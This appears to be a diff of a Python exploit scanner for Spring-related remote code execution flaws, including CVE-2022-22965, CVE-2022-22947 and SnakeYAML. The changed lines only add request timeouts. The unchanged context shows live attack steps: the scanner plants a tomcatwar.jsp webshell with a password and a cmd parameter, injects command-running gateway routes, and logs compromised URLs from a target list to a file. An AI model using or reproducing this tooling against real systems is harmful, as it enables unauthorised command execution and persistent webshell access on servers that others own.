@@ -9,7 +9,7 @@ from termcolor import cprint
 from time import sleep
 import urllib3
 urllib3.disable_warnings()
-requests.timeout = 10
+outtime = 10
 
 ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
@@ -36,13 +36,13 @@ def CVE_2022_22965(url, proxies):
     getpayload = url + payload_http
     try:
         requests.packages.urllib3.disable_warnings()
-        requests.post(url, headers=Headers_1, data=data1, allow_redirects=False, verify=False, proxies=proxies)
+        requests.post(url, headers=Headers_1, timeout = outtime, data=data1, allow_redirects=False, verify=False, proxies=proxies)
         sleep(0.5)
-        requests.post(url, headers=Headers_1, data=data2, allow_redirects=False, verify=False, proxies=proxies)
+        requests.post(url, headers=Headers_1, timeout = outtime, data=data2, allow_redirects=False, verify=False, proxies=proxies)
         sleep(0.5)
-        requests.get(getpayload, headers=Headers_1, allow_redirects=False, verify=False, proxies=proxies)
+        requests.get(getpayload, headers=Headers_1, timeout = outtime, allow_redirects=False, verify=False, proxies=proxies)
         sleep(0.5)
-        test = requests.get(url + "tomcatwar.jsp", allow_redirects=False, verify=False, proxies=proxies)
+        test = requests.get(url + "tomcatwar.jsp", timeout = outtime, allow_redirects=False, verify=False, proxies=proxies)
         if (test.status_code == 200):
             cprint("[+] [CVE-2022-22965] Webshell为：" + url + "tomcatwar.jsp?pwd=tomcat&cmd=whoami" ,"red")
             f2 = open("vulout.txt", "a")
@@ -76,7 +76,7 @@ def CVE_2022_22963(url, proxies):
     try:
         urltest = url + path
         requests.packages.urllib3.disable_warnings()
-        req = requests.post(url=urltest, headers=header, data=data, verify=False, proxies=proxies)
+        req = requests.post(url=urltest, headers=header, timeout = outtime, data=data, verify=False, proxies=proxies)
         code = req.status_code
         text = req.text
         rsp = '"error":"Internal Server Error"'
@@ -123,20 +123,20 @@ def CVE_2022_22947(url, proxies):
 
     try:
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_linux, headers=headers1, json=json ,verify=False, proxies=proxies)
-        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
-        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", timeout = outtime, data=payload_linux, headers=headers1, json=json ,verify=False, proxies=proxies)
+        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
         if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
             cprint(f'[+] [CVE-2022-22947] {url}', "red")
             f2 = open("vulout.txt", "a")
             f2.write("[+] [CVE-2022-22947] " + url + '\n')
             f2.close()
         else:
-            re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
-            re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
-            re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_windows, headers=headers1, json=json ,verify=False, proxies=proxies)
-            re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
-            re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
+            re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+            re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+            re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_windows, headers=headers1, timeout = outtime, json=json ,verify=False, proxies=proxies)
+            re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+            re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
             if ('<DIR>' in str(re3.text)):
                 cprint(f'[+] [CVE-2022-22947] {url}', "red")
                 f2 = open("vulout.txt", "a")
@@ -144,8 +144,8 @@ def CVE_2022_22947(url, proxies):
                 f2.close()
             else:
                 cprint("[-] 目标 " + url + " 验证CVE-2022-22947漏洞不存在", "yellow")
-                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, verify=False, proxies=proxies)
-                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, verify=False, proxies=proxies)
+                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
@@ -171,7 +171,7 @@ def JeeSpring_2023(url,proxies):
     
     try:
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + path, data=payload, headers=headers1, verify=False, proxies=proxies)
+        re1 = requests.post(url=url + path, data=payload, headers=headers1, timeout = outtime, verify=False, proxies=proxies)
         code1 = re1.status_code
         if ('jsp' in str(re1.text)) and (int(code1) == 200):
             cprint(f'[+] [JeeSpring_2023] {url}', "red")
@@ -196,12 +196,12 @@ def JolokiaRCE(url,proxies):
     
     try:
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + path1, allow_redirects=False, verify=False, proxies=proxies)
+        re1 = requests.post(url=url + path1, timeout = outtime, allow_redirects=False, verify=False, proxies=proxies)
         code1 = re1.status_code
-        re2 = requests.post(url=url + path2, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.post(url=url + path2, timeout = outtime, allow_redirects=False, verify=False, proxies=proxies)
         code2 = re2.status_code
         if ((int(code1) == 200) or (int(code2) == 200)):
-            retest = requests.get(url=url + path3, verify=False, proxies=proxies)
+            retest = requests.get(url=url + path3, timeout = outtime, verify=False, proxies=proxies)
             code3 = retest.status_code
             if ('reloadByURL' in str(retest.text)) and (code3 == 200):
                 cprint(f'[+] [Jolokia-Realm-JNDI-RCE-1] {url}', "red")
@@ -232,10 +232,10 @@ def CVE_2021_21234(url,proxies):
 
     try:
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + payload1, verify=False, proxies=proxies)
-        re2 = requests.post(url=url + payload2, verify=False, proxies=proxies)
-        re3 = requests.post(url=url + payload3, verify=False, proxies=proxies)
-        re4 = requests.post(url=url + payload4, verify=False, proxies=proxies)
+        re1 = requests.post(url=url + payload1, timeout = outtime, verify=False, proxies=proxies)
+        re2 = requests.post(url=url + payload2, timeout = outtime, verify=False, proxies=proxies)
+        re3 = requests.post(url=url + payload3, timeout = outtime, verify=False, proxies=proxies)
+        re4 = requests.post(url=url + payload4, timeout = outtime, verify=False, proxies=proxies)
         if (('MAPI' in str(re1.text)) or ('MAPI' in str(re2.text))):
             cprint(f'[+] [CVE-2021-21234-Win] {url}', "red")
             f2 = open("vulout.txt", "a")
@@ -273,8 +273,8 @@ def SnakeYAML_RCE(url,proxies):
     try:
         requests.packages.urllib3.disable_warnings()
         urltest = url + path
-        re1 = requests.post(url=urltest, headers=Headers_1, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
-        re2 = requests.post(url=urltest, headers=Headers_2, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
+        re1 = requests.post(url=urltest, headers=Headers_1, timeout = outtime, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.post(url=urltest, headers=Headers_2, timeout = outtime, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
         if ('example.yml' in str(re1.text)):
             cprint(f'[+] [SnakeYAML_RCE-1] {url}', "red")
             f2 = open("vulout.txt", "a")
@@ -314,8 +314,8 @@ def Eureka_xstream_RCE(url,proxies):
         requests.packages.urllib3.disable_warnings()
         urltest1 = url + path1
         urltest2 = url + path2
-        re1 = requests.post(url=urltest1, headers=Headers_1, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
-        re2 = requests.post(url=urltest2, headers=Headers_2, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
+        re1 = requests.post(url=urltest1, headers=Headers_1, timeout = outtime, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.post(url=urltest2, headers=Headers_2, timeout = outtime, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
         if ('127.0.0.2' in str(re1.text)):
             cprint(f'[+] [Eureka_Xstream-1] {url}', "red")
             f2 = open("vulout.txt", "a")
@@ -350,7 +350,7 @@ def CVE_2018_1273(url,proxies):
         requests.packages.urllib3.disable_warnings()
         urltest1 = url + path1
         urltest2 = url + path2
-        re1 = requests.get(url=urltest1, headers=Headers, allow_redirects=False, verify=False, proxies=proxies)
+        re1 = requests.get(url=urltest1, headers=Headers, timeout = outtime, allow_redirects=False, verify=False, proxies=proxies)
         code1 = re1.status_code
         if ((int(code1) == 200) and ('Users' in str(re1.text))):
             cprint(f'[+] [CVE-2018-1273] {url}', "red")
@@ -415,7 +415,7 @@ def poc(filename,proxies):
                 url = url + "/"
             try:
                 requests.packages.urllib3.disable_warnings()
-                r = requests.get(url, verify=False, proxies=proxies)
+                r = requests.get(url, timeout = outtime, verify=False, proxies=proxies)
                 if r.status_code == 503:
                     continue
             except KeyboardInterrupt:
